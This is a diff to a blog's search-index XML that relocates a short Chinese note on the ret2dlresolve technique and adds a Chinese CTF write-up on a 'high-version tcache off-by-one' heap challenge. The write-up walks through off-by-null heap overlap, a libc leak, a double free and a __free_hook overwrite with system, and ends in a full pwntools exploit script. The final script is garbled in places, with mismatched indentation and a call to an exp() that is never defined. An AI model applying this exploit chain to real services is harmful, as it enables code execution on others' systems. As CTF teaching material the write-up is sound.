@@ -454,6 +454,20 @@ io<span class="token punctuation">.</span>interactive<span class="token punctuat
       </tags>
   </entry>
   <entry>
+    <title>浅谈Ret2dlresolve</title>
+    <url>/2024/04/20/%E6%B5%85%E8%B0%88ret2dlresolve/</url>
+    <content><![CDATA[<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>在linux中，程序使用_dl_runtime_resolve(link_map_obj,reloc_offset)来进行动态链接的函数进行重定位。那么如果我们可以控制相应的参数及其对应地址的内容是不是就可以直接控制解析的函数了。具体就是利用动态链接器在解析符号地址时所使用的重定位表项、动态符号表、动态符号串都是从目标文件中的动态节.dynamic索引得到的。所以如果我们能够修改其中的某些内容使得最后动态链接器解析的符号是我们想要解析的符号，那就攻击成功。</p>
+<h2 id="基础知识-延迟绑定"><a href="#基础知识-延迟绑定" class="headerlink" title="基础知识-延迟绑定"></a>基础知识-延迟绑定</h2><p>思考思考，在linux中一个函数是如何正常运行的呢？</p>
+]]></content>
+      <categories>
+        <category>学习</category>
+      </categories>
+      <tags>
+        <tag>ROP</tag>
+        <tag>ret2dlresolve</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>浅谈Ret2reg的理解</title>
     <url>/2024/04/20/%E6%B5%85%E8%B0%88Ret2reg%E7%9A%84%E7%90%86%E8%A7%A3/</url>
     <content><![CDATA[<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>1，查看栈溢出返回时哪个寄存器指向缓冲区空间。</p>
@@ -479,17 +493,160 @@ ROPgadget <span class="token parameter variable">--binary</span> vuln <span clas
       </tags>
   </entry>
   <entry>
-    <title>浅谈Ret2dlresolve</title>
-    <url>/2024/04/20/%E6%B5%85%E8%B0%88ret2dlresolve/</url>
-    <content><![CDATA[<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>在linux中，程序使用_dl_runtime_resolve(link_map_obj,reloc_offset)来进行动态链接的函数进行重定位。那么如果我们可以控制相应的参数及其对应地址的内容是不是就可以直接控制解析的函数了。具体就是利用动态链接器在解析符号地址时所使用的重定位表项、动态符号表、动态符号串都是从目标文件中的动态节.dynamic索引得到的。所以如果我们能够修改其中的某些内容使得最后动态链接器解析的符号是我们想要解析的符号，那就攻击成功。</p>
-<h2 id="基础知识-延迟绑定"><a href="#基础知识-延迟绑定" class="headerlink" title="基础知识-延迟绑定"></a>基础知识-延迟绑定</h2><p>思考思考，在linux中一个函数是如何正常运行的呢？</p>
+    <title>高版本Tcache+off-by-One</title>
+    <url>/2024/08/19/%E9%AB%98%E7%89%88%E6%9C%ACtcache-off-by-one/</url>
+    <content><![CDATA[<h5 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h5><p>利用off-by-one实现堆向前重叠，在通过不断割掉unsortbins里面的chunk块达到泄露libc基地址，后面来利用前面的堆重叠来实现doule free将chunk申请到__free_hook上面将其修改为system，最后getshell。</p>
+<h5 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h5><p>保护全开</p>
+<p>main函数，经典菜单题,没有edit函数。感觉基本上漏洞点肯定在add（）函数里面</p>
+<p><img src="https://s2.loli.net/2024/08/19/Z9FxX1U3Iwm7EiJ.png" alt="7eb2d33ff08e47bf8090ba7306a18ffc.png"></p>
+<p>delete函数，指针置0了没有uaf</p>
+<p><img src="https://s2.loli.net/2024/08/19/fxum4vkcXia1KjS.png" alt="73b33edf07a943cfb65133ae007e4828.png"></p>
+<p>add函数，存在off-by-null，而且只给申请15个chunk</p>
+<p><img src="https://s2.loli.net/2024/08/19/Wma5IAe2StEnN3x.png" alt="a6fcc88eaf094ec58b2d4cdb78ced075.png"></p>
+<h5 id="结合exp分析"><a href="#结合exp分析" class="headerlink" title="结合exp分析"></a>结合exp分析</h5><p>先把tcache填满，申请的大小必须大于0xf0，因为off-by-null会将低位修改为0，如果你是0x90就会变成0x00</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    add<span class="token punctuation">(</span><span class="token number">0xf0</span><span class="token punctuation">,</span>i<span class="token punctuation">,</span><span class="token string">'AAAA'</span><span class="token punctuation">)</span>
+
+add<span class="token punctuation">(</span><span class="token number">0xf0</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token string">'B'</span><span class="token punctuation">)</span>
+add<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">'B'</span><span class="token punctuation">)</span>
+add<span class="token punctuation">(</span><span class="token number">0xf0</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token string">'B'</span><span class="token punctuation">)</span>
+add<span class="token punctuation">(</span><span class="token number">0x28</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token string">'B'</span><span class="token punctuation">)</span>
+
+<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    delete<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
+<p>把序号为8的chunk的pre_size位修改为0x100，同时序号为7的chunk进入到unsortbins里面（此时需要将其的fd和bk指针给到序号为8的chunk），制造假chunk头，0x120为前面序号为7和8的chunk大小和</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">delete<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span>
+delete<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span>
+add<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x10</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x120</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#制造假chunk头，0x120为前面序号为7和8的chunk大小和，把序        </span>
+号为<span class="token number">9</span>的chunk的pre_size位修改为<span class="token number">0x100</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
+<p>此时的内存对应的chunk序号为8</p>
+<p><img src="https://s2.loli.net/2024/08/19/qRQ4nFuVDXpAWLt.png" alt="11c270ae2b8c44b8b601cd2b3282247c.png"></p>
+<p>堆重叠，此时合并序号为7，8，9的chunk进入到unsortbins里面（但其实序号为8的chunk根本没有free，可供我们利用），大小为0x220，两次申请特殊大小的chunk，从unsortbins里面分割出来chunk其大小为序号为7的chunk，这样就可以将其fd和bk指针给到0x55c0a9334a60处。为什么不直接申请0xf0，因为直接申请bins会将tcache里面的chunk给你。包括第二个chunk的size为0x20，这是为后面doule free做准备。本人也是无意之间做到的，实属运气加成了。</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">delete<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span><span class="token comment">#堆向前合并掉序号为8的chunk</span>
+add<span class="token punctuation">(</span><span class="token number">0xc0</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token string">'B'</span><span class="token punctuation">)</span><span class="token comment">#这两个chunk的大小加起来正好等于序号为7的chunk</span>
+add<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token string">'B'</span><span class="token punctuation">)</span><span class="token comment">#此chunk的大小必须为属于序号为8的chunk的大小</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
+<p>show序号为8的chunk就可以得到unsortbins_addr,</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">show<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span>
+
+leak_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"\x7f"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"leak_addr = </span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">hex</span><span class="token punctuation">(</span>leak_addr<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
+
+__malloc_hook <span class="token operator">=</span> leak_addr <span class="token operator">-</span> <span class="token number">0x60</span><span class="token operator">-</span><span class="token number">0x10</span>
+
+libc_base <span class="token operator">=</span> __malloc_hook <span class="token operator">-</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">"__malloc_hook"</span><span class="token punctuation">]</span>
+log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"libc_base = </span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">hex</span><span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
+fake_chunk <span class="token operator">=</span> __malloc_hook <span class="token operator">-</span><span class="token number">0x23</span>
+
+free_hook <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__free_hook'</span><span class="token punctuation">]</span>
+log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"free_hook  = </span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">hex</span><span class="token punctuation">(</span>free_hook<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
+system <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>
+log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"system  = </span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">hex</span><span class="token punctuation">(</span>system<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
+<p>日志结果</p>
+<p><img src="https://s2.loli.net/2024/08/19/cL6yFxEtOrzM3CY.png" alt="7dbea093fbc443228769956bf6cbbf34.png"></p>
+<p>此时想办法将free_hook修改为system。将堆重叠的那块区域给申请出来。这样就可以构成double free</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"> add<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">)</span><span class="token comment">#分割unsortbins的大小。其实是为了让序号为8的那块chunk归我所用</span>
+
+delete<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span>
+delete<span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">)</span><span class="token comment">#double free</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
+<p>查看bins，可以看到大小为0x20的形成了双链结构</p>
+<p><img src="https://s2.loli.net/2024/08/19/jxwfcJGbgS4LvXz.png" alt="e519e95e57584651bf7ea54c756a17a4.png"></p>
+<p>最后就是正常的步骤</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">add<span class="token punctuation">(</span><span class="token number">0x8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>free_hook<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#将其的fd指针指向free_hook</span>
+
+add<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token string">'/bin/sh\x00'</span><span class="token punctuation">)</span><span class="token comment">#将0x55cd056ba60的chunk申请掉</span>
+add<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>system<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#将__free_hook修改为system的地址</span>
+
+delete<span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
+<p>最后getshell</p>
+<p><img src="https://s2.loli.net/2024/08/19/VEUiIOgPv9RsjBe.png" alt="63a402e8a92c4c8bb7875c0f89f2b552.png"></p>
+<h5 id="最后完整的exp"><a href="#最后完整的exp" class="headerlink" title="最后完整的exp"></a>最后完整的exp</h5><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span>index<span class="token punctuation">,</span>name<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Your Choice:'</span><span class="token punctuation">,</span><span class="token string">'1'</span><span class="token punctuation">)</span>
+        io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Index: '</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>
+        io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Size: '</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>
+        io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">'Content'</span><span class="token punctuation">,</span>name<span class="token punctuation">)</span>
+
+    <span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Your Choice:'</span><span class="token punctuation">,</span><span class="token string">'2'</span><span class="token punctuation">)</span>
+        io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Index:'</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+    <span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Your Choice:'</span><span class="token punctuation">,</span><span class="token string">'3'</span><span class="token punctuation">)</span>
+        io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Index:'</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>
+    
+    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        add<span class="token punctuation">(</span><span class="token number">0xf0</span><span class="token punctuation">,</span>i<span class="token punctuation">,</span><span class="token string">'AAAA'</span><span class="token punctuation">)</span>
+
+    add<span class="token punctuation">(</span><span class="token number">0xf0</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token string">'B'</span><span class="token punctuation">)</span><span class="token comment">#此chunk需要和前面的chunk大小保持一直</span>
+    add<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">'B'</span><span class="token punctuation">)</span>
+    add<span class="token punctuation">(</span><span class="token number">0xf0</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token string">'B'</span><span class="token punctuation">)</span><span class="token comment">#此chunk的大小至少为0xf0，因为off-by-null会将低位修改为0。</span>
+    add<span class="token punctuation">(</span><span class="token number">0x28</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token string">'B'</span><span class="token punctuation">)</span>
+
+    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        delete<span class="token punctuation">(</span>i<span class="token punctuation">)</span>
+    
+    delete<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span>
+    delete<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span>
+    add<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x10</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x120</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#制造假chunk头，0x120为前面序号为7和8的chunk大小和，把        序号为9的chunk的pre_size位修改为0x100</span>
+
+    delete<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span><span class="token comment">#堆向前合并掉序号为8的chunk</span>
+    add<span class="token punctuation">(</span><span class="token number">0xc0</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token string">'B'</span><span class="token punctuation">)</span><span class="token comment">#这两个chunk的大小加起来正好等于序号为7的chunk</span>
+    add<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token string">'B'</span><span class="token punctuation">)</span><span class="token comment">#此chunk的大小必须为属于序号为8的chunk的大小</span>
+
+    show<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span>
+
+    leak_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"\x7f"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+    log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"leak_addr = </span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">hex</span><span class="token punctuation">(</span>leak_addr<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
+
+    __malloc_hook <span class="token operator">=</span> leak_addr <span class="token operator">-</span> <span class="token number">0x60</span><span class="token operator">-</span><span class="token number">0x10</span>
+    
+    libc_base <span class="token operator">=</span> __malloc_hook <span class="token operator">-</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">"__malloc_hook"</span><span class="token punctuation">]</span>
+    log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"libc_base = </span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">hex</span><span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
+    fake_chunk <span class="token operator">=</span> __malloc_hook <span class="token operator">-</span><span class="token number">0x23</span>
+
+    free_hook <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__free_hook'</span><span class="token punctuation">]</span>
+    log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"free_hook  = </span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">hex</span><span class="token punctuation">(</span>free_hook<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
+    system <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>
+    log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"system  = </span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">hex</span><span class="token punctuation">(</span>system<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
+
+    add<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">)</span><span class="token comment">#分割unsortbins的大小。其实是为了让序号为8的那块chunk归我所用</span>
+
+    delete<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span>
+    delete<span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">)</span><span class="token comment">#double free</span>
+
+    add<span class="token punctuation">(</span><span class="token number">0x8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>free_hook<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#将其的fd指针指向free_hook</span>
+
+    add<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token string">'/bin/sh\x00'</span><span class="token punctuation">)</span><span class="token comment">#将0x55cd056ba60的chunk申请掉</span>
+    add<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>system<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#将__free_hook修改为system的地址</span>
+
+    delete<span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">)</span>
+ 
+exp<span class="token punctuation">(</span><span class="token punctuation">)</span>  
+
+io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
 ]]></content>
       <categories>
         <category>学习</category>
+        <category>笔记</category>
       </categories>
       <tags>
-        <tag>ROP</tag>
-        <tag>ret2dlresolve</tag>
+        <tag>Heap</tag>
+        <tag>tcache</tag>
+        <tag>高libc</tag>
+        <tag>二进制</tag>
       </tags>
   </entry>
 </search>
